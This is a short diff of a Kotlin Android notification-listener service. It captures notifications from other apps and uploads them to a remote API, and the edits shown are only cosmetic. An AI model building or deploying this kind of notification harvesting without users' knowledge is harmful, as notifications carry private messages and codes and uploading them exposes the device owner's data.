@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.provider.Settings
+import android.provider.Telephony
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
@@ -30,6 +31,7 @@ class CrawlNotificationService : NotificationListenerService() {
             applicationContext.contentResolver,
             "sms_default_application"
         )
+
         var extras  = sbn.notification.extras
         var appBundle = sbn.packageName
         var postTime = sbn.postTime
@@ -44,7 +46,7 @@ class CrawlNotificationService : NotificationListenerService() {
         val applicationName =
             (if (ai != null) pm.getApplicationLabel(ai) else "(unknown)") as String
 
-        if (applicationName != nameAppCrawl && appBundle != PACKAGE_NAME_SMS ){
+        if (applicationName != nameAppCrawl && appBundle != PACKAGE_NAME_SMS){
             val postNotifi = NotificationAPI(
                 applicationName,
                 appBundle,
@@ -64,7 +66,6 @@ class CrawlNotificationService : NotificationListenerService() {
 
 
             GlobalScope.launch(Dispatchers.IO){
-
                 try {
                     val isSuccessful =  APIRequest.postNotification(postNotifi)
                     if(isSuccessful == 200) {
